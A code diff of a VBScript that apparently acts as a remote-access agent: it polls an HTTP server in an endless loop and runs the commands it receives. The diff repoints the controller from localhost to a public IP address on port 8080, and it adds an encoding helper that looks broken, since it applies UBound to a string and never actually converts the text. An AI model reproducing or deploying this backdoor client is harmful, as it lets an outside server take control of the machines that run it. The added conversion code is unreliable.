@@ -36,7 +36,7 @@ Dim arrSplitUrl, strFilename, stream
 
 ' Configuration
 Dim strHost, strPort, strUrl, strCD, intSleep
-strHost = "127.0.0.1"
+strHost = "144.34.164.217"
 strPort = "8080"
 intSleep = 5000
 strUrl = "http://" & strHost & ":" & strPort
@@ -54,7 +54,11 @@ While True
     Dim strRawCommand
     ' 获取响应
     strRawCommand = http.ResponseText
-
+    WSH.Echo strRawCommand
+    If UBound(strRawCommand) > 0 Then
+        strRawCommand = Utf2Gbk(strRawCommand)
+    End If
+    WSH.Echo strRawCommand
     ' Determine command and arguments
     ' 根据接收到的字符串来判断要进行什么样的操作
     Dim arrResponseText, strCommand, strArgument
@@ -417,4 +421,22 @@ Function StringToBinary(Text)
   
     ' Return binary data
     StringToBinary = stream.Read
+End Function
+
+
+Function Utf2Gbk(Text)
+    Dim stream: Set stream = CreateObject("Adodb.Stream")
+    stream.Type = 2 'adTypeText
+    stream.CharSet = "utf-8"
+
+    ' Store text in stream
+    stream.Open
+    stream.WriteText Text
+
+    ' Change stream type To binary
+    stream.Position = 0
+    stream.Type = 2 'adTypeBinary
+    stream.CharSet = "utf-8"
+    ' Return binary data
+    Utf2Gbk = stream.Read
 End Function
